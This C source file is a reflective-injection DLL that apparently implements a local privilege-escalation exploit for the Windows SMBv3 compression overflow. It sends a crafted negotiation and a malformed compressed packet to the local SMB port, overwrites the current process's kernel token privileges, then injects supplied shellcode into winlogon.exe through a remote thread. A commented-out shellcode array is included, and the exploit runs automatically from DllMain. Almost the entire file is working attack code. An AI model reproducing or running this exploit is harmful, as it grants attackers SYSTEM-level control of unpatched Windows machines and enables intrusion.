//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//

#include <winsock2.h>
#include "ReflectiveLoader.h"
#include <stdio.h>
#include <stdint.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include "ntos.h"

#pragma comment(lib, "ws2_32.lib")
// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//

ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX_EXP pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX_EXP)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return -1;
}

ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	ULONG64 ktoken = get_handle_addr(token);

	return ktoken;
}

int error_exit(SOCKET sock, const char* msg) {
	int err;
	if (msg != NULL) {
		printf("%s failed with error: %d\n", msg, WSAGetLastError());
	}
	if ((err = closesocket(sock)) == SOCKET_ERROR) {
		printf("closesocket() failed with error: %d\n", WSAGetLastError());
	}
	WSACleanup();
	return 1;
}

int send_negotiation(SOCKET sock) {
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,                   /* session */
		0x00, 0x00, 0xC4,       /* length */

		/* SMB Header */
		0xFE, 0x53, 0x4D, 0x42, /* protocol id */
		0x40, 0x00,             /* structure size, must be 0x40 */
		0x00, 0x00,             /* credit charge */
		0x00, 0x00,             /* channel sequence */
		0x00, 0x00,             /* channel reserved */
		0x00, 0x00,             /* command */
		0x00, 0x00,             /* credits requested */
		0x00, 0x00, 0x00, 0x00, /* flags */
		0x00, 0x00, 0x00, 0x00, /* chain offset */
		0x00, 0x00, 0x00, 0x00, /* message id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x00, 0x00, 0x00, 0x00, /* tree id */
		0x00, 0x00, 0x00, 0x00, /* session id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* signature */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,

		/* SMB Negotiation Request */
		0x24, 0x00,             /* structure size */
		0x08, 0x00,             /* dialect count, 8 */
		0x00, 0x00,             /* security mode */
		0x00, 0x00,             /* reserved */
		0x7F, 0x00, 0x00, 0x00, /* capabilities */
		0x01, 0x02, 0xAB, 0xCD, /* guid */
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x78, 0x00,             /* negotiate context */
		0x00, 0x00,             /* additional padding */
		0x02, 0x00,             /* negotiate context count */
		0x00, 0x00,             /* reserved 2 */
		0x02, 0x02,             /* dialects, SMB 2.0.2 */
		0x10, 0x02,             /* SMB 2.1 */
		0x22, 0x02,             /* SMB 2.2.2 */
		0x24, 0x02,             /* SMB 2.2.3 */
		0x00, 0x03,             /* SMB 3.0 */
		0x02, 0x03,             /* SMB 3.0.2 */
		0x10, 0x03,             /* SMB 3.0.1 */
		0x11, 0x03,             /* SMB 3.1.1 */
		0x00, 0x00, 0x00, 0x00, /* padding */

		/* Preauth context */
		0x01, 0x00,             /* type */
		0x26, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x01, 0x00,             /* hash algorithm count */
		0x20, 0x00,             /* salt length */
		0x01, 0x00,             /* hash algorith, SHA512 */
		0x00, 0x00, 0x00, 0x00, /* salt */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00,             /* pad */

		/* Compression context */
		0x03, 0x00,             /* type */
		0x0E, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x02, 0x00,             /* compression algorithm count */
		0x00, 0x00,             /* padding */
		0x01, 0x00, 0x00, 0x00, /* flags */
		0x02, 0x00,             /* LZ77 */
		0x03, 0x00,             /* LZ77+Huffman */
		0x00, 0x00, 0x00, 0x00, /* padding */
		0x00, 0x00, 0x00, 0x00
	};

	if ((err = send(sock, (const char*)buf, sizeof(buf), 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	return err;
}

int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x33,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x10 + len);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));
	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;
	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;
	memcpy(packet + sizeof(buf) + 0x10, buffer, len);

	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}

void inject(uint8_t * shellcode) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	/*
	uint8_t shellcode[] = {
		 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54,
		 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99,
		 0xff, 0xc2, // inc edx (1 = SW_SHOW)
		 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3, 0x00
	};
	*/
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (lstrcmpiA(entry.szExeFile, "winlogon.exe") == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);

	if (pid < 0) {
		printf("Could not find process\n");
		return;
	}
	printf("Injecting shellcode in winlogon...\n");

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		printf("Could not open process\n");
		return;
	}

	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpMem == NULL) {
		printf("Remote allocation failed\n");
		return;
	}
	if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {
		printf("Remote write failed\n");
		return;
	}
	if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {
		printf("CreateRemoteThread failed\n");
		return;
	}

	printf("Success! ;)\n");
}

int exploit(uint8_t * Shellcode) {
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	uint64_t ktoken = 0;

	int err = 0;
	if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {
		printf("WSAStartup() failed with error: %d\n", err);
		return EXIT_FAILURE;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		printf("Couldn't find a usable version of Winsock.dll\n");
		WSACleanup();
		return EXIT_FAILURE;
	}

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		printf("socket() failed with error: %d\n", WSAGetLastError());
		WSACleanup();
		return EXIT_FAILURE;
	}

	struct sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(445);
	InetPton(AF_INET, "127.0.0.1", &client.sin_addr);

	if (connect(sock, (struct sockaddr *)&client, sizeof(client)) == SOCKET_ERROR) {
		return error_exit(sock, "connect()");
	}

	printf("Successfully connected socket descriptor: %d\n", (int)sock);
	printf("Sending SMB negotiation request...\n");

	if (send_negotiation(sock) == SOCKET_ERROR) {
		printf("Couldn't finish SMB negotiation\n");
		return error_exit(sock, "send()");
	}

	printf("Finished SMB negotiation\n");
	ULONG buffer_size = 0x1110;
	UCHAR* buffer = (UCHAR*)malloc(buffer_size);
	if (buffer == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	ktoken = get_process_token();
	if (ktoken == -1) {
		printf("Couldn't leak ktoken of current process...\n");
		return 1;
	}

	printf("Found kernel token at %#llx\n", ktoken);

	memset(buffer, 'A', 0x1108);
	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}

	printf("Sending compressed buffer...\n");

	if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {
		return error_exit(sock, "send()");
	}

	printf("SEP_TOKEN_PRIVILEGES changed\n");
	inject(Shellcode);

	WSACleanup();
	return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			// MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
			exploit((uint8_t *)lpReserved);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}